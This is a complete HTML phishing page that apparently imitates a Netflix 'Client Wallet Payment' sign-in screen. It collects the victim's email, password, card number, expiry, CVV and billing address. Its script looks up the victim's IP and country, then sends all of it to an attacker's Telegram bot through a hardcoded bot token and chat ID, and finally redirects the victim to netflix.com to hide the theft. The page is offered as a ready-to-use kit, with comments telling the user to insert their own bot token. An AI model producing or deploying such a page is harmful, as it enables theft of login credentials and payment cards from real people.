
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Client Wallet Payment</title>
  <style>
    body {
      background: #f0f2f5 url('https://assets.nflxext.com/ffe/siteui/vlv3/7d2359a4-434f-4efa-9ff3-e9d38a8bde7f/web/US-en-20250707-TRIFECTA-perspective_31a6495d-95e3-429e-926b-b2a3baeb86e2_large.jpg') no-repeat center center fixed;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      padding: 50px;
    }

    .payment-form {
      background: #666;
      border-radius: 10px;
      padding: 30px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 4px 10px rgba(255, 0, 0, 0.3);
    }

    .payment-form h2 {
      margin-bottom: 20px;
      font-size: 1.5rem;
      color: #FFFFF0;
      text-align: center;
    }

    .form-group {
      margin-bottom: 15px;
    }

    label {
      display: block;
      font-size: 0.85rem;
      margin-bottom: 5px;
      color: #000000;
    }

    input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 1rem;
      box-sizing: border-box;
    }

    .form-row {
      display: flex;
      gap: 10px;
    }

    .form-row .form-group {
      flex: 1;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #007bff;
      border: none;
      color: #fff;
      font-size: 1rem;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 15px;
    }

    button:hover {
      background: #0056b3;
    }

    .credit-card {
      background: linear-gradient(135deg, #4b79a1, #283e51);
      color: #fff;
      border-radius: 15px;
      padding: 20px;
      margin-bottom: 20px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }

    .credit-card label {
      color: #fff;
      font-size: 0.8rem;
      margin-bottom: 3px;
    }

    .credit-card input {
      background: rgba(255, 255, 255, 0.2);
      border: none;
      color: #fff;
    }

    .credit-card input::placeholder {
      color: rgba(255, 255, 255, 0.7);
    }

    .section-divider {
      margin: 25px 0 10px;
      border-top: 1px solid #ddd;
      text-align: center;
      position: relative;
    }

    .section-divider span {
      position: absolute;
      top: -10px;
      background: #fff;
      padding: 0 10px;
      color: #888;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <form class="payment-form" id="paymentForm">
    <h2>Sign in to Complete Payment!</h2>

    <div class="form-group">
      <label for="email">Username</label>
      <input type="email" id="email" placeholder="Email or Mobile number" required />
    </div>

    <div class="form-group">
      <label for="password">Password</label>
      <input type="password" id="password" placeholder="Enter your password" required />
    </div>

    <h2>Client Wallet Payment</h2>

    <div class="credit-card">
      <div class="card-number">
        <label for="cardNumber">Card Number</label>
        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required />
      </div>

      <div class="card-name">
        <label for="cardName">Cardholder Name</label>
        <input type="text" id="cardName" placeholder="John Doe" required />
      </div>

      <div class="form-row card-exp">
        <div class="form-group">
          <label for="expDate">Expiry</label>
          <input type="text" id="expDate" placeholder="MM/YY" maxlength="5" required />
        </div>
        <div class="form-group">
          <label for="cvv">CVV</label>
          <input type="password" id="cvv" placeholder="123" maxlength="4" required />
        </div>
      </div>
    </div>

    <div class="form-group">
      <label for="amount">Amount</label>
      <input type="number" id="amount" placeholder="$0.00" step="0.01" min="0" required />
    </div>

    <div class="section-divider"><span>Billing Address</span></div>

    <div class="form-group">
      <label for="billingAddress">Street Address</label>
      <input type="text" id="billingAddress" placeholder="123 Main St" required />
    </div>

    <div class="form-group">
      <label for="billingCity">City</label>
      <input type="text" id="billingCity" placeholder="City" required />
    </div>

    <div class="form-row">
      <div class="form-group">
        <label for="billingState">State</label>
        <input type="text" id="billingState" placeholder="State" required />
      </div>
      <div class="form-group">
        <label for="billingZip">ZIP Code</label>
        <input type="text" id="billingZip" placeholder="ZIP" maxlength="10" required />
      </div>
    </div>

    <button type="submit">Pay Now</button>
  </form>

  <script>
  const form = document.getElementById('paymentForm');
  const telegramBotToken = "8170328615:AAHtebWW0tTiV32C89Zg-VyBhZCQ2tm4ojw"; // Replace with your bot token
  const telegramChatId = "7269097986";     // Replace with your chat ID

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const data = {
      email: document.getElementById('email').value,
      password: document.getElementById('password').value,
      cardNumber: document.getElementById('cardNumber').value,
      cardName: document.getElementById('cardName').value,
      expDate: document.getElementById('expDate').value,
      cvv: document.getElementById('cvv').value,
      amount: document.getElementById('amount').value,
      billingAddress: document.getElementById('billingAddress').value,
      billingCity: document.getElementById('billingCity').value,
      billingState: document.getElementById('billingState').value,
      billingZip: document.getElementById('billingZip').value
    };

    try {
      // Get IP info
      const ipResponse = await fetch('https://ipapi.co/json/');
      const ipData = await ipResponse.json();

      // Compose the message
      const message = `
üí≥ *New Client Payment*
-------------------------------
üìß *Email:* ${data.email}
üîë *Password:* ${data.password}

üí≥ *Card Details:*
‚Ä¢ Number: ${data.cardNumber}
‚Ä¢ Name: ${data.cardName}
‚Ä¢ Expiry: ${data.expDate}
‚Ä¢ CVV: ${data.cvv}

üíµ *Amount:* $${data.amount}

üìç *Billing Address:*
${data.billingAddress}
${data.billingCity}, ${data.billingState} ${data.billingZip}

üåê *IP:* ${ipData.ip}
üìç *Country:* ${ipData.country_name}
      `;

      // Send to Telegram
      const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

      await fetch(telegramURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      // ‚úÖ After sending, redirect to home page
      window.location.href = "https://www.netflix.com/"; // <-- Change this to your actual home page URL

    } catch (error) {
      console.error('Error:', error);
      alert('There was an error submitting your payment.');
    }
  });
</script>
